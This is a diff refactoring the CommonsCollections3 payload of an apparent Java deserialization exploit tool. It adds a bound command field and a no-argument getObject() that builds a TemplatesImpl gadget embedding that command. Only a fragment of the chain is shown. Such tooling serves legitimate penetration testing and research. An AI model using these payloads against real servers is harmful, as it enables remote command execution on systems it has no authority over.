@@ -12,6 +12,8 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -27,7 +29,16 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
 
+	@Bind private String command;
+	
+	/**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
 	public Object getObject(final String command) throws Exception {
+		return getObject();
+	}
+
+	public Object getObject() throws Exception {
 		Object templatesImpl = Gadgets.createTemplatesImpl(command);
 
 		// inert chain for setup
